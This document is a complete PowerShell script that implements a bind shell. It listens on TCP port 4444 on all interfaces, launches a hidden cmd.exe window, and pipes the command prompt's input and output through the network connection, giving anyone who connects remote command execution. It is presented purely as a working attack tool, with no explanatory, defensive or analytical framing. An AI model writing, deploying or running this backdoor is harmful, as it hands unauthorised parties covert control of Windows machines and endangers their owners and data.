param(
  [int]$Port = 4444,
  [string]$Bind = "0.0.0.0"
)

$listener = [System.Net.Sockets.TcpListener]::new([Net.IPAddress]::Parse($Bind), $Port)
$listener.Start()
Write-Host "[+] Listening on $Bind:$Port ..."
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
Write-Host "[+] Connection from $($client.Client.RemoteEndPoint)"

# Start a hidden cmd.exe with redirected stdio
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.UseShellExecute = $false
$psi.RedirectStandardInput  = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError  = $true
$psi.CreateNoWindow = $true
$proc = New-Object System.Diagnostics.Process
$proc.StartInfo = $psi
[void]$proc.Start()

# Pump cmd → socket (stdout)
$outJob = Start-Job -ScriptBlock {
  param($so,$ns)
  $buf = New-Object byte[] 4096
  while (($read = $so.BaseStream.Read($buf,0,$buf.Length)) -gt 0) {
    $ns.Write($buf,0,$read); $ns.Flush()
  }
} -ArgumentList $proc.StandardOutput, $stream

# Pump stderr → socket
$errJob = Start-Job -ScriptBlock {
  param($se,$ns)
  $buf = New-Object byte[] 4096
  while (($read = $se.BaseStream.Read($buf,0,$buf.Length)) -gt 0) {
    $ns.Write($buf,0,$read); $ns.Flush()
  }
} -ArgumentList $proc.StandardError, $stream

# Pump socket → cmd (stdin)
$inBuf = New-Object byte[] 4096
try {
  while (($r = $stream.Read($inBuf,0,$inBuf.Length)) -gt 0) {
    $proc.StandardInput.BaseStream.Write($inBuf,0,$r)
    $proc.StandardInput.BaseStream.Flush()
  }
} finally {
  $proc.Close(); $stream.Close(); $client.Close(); $listener.Stop()
  Get-Job $outJob,$errJob | Stop-Job | Remove-Job -Force
  Write-Host "[*] Session closed."
}
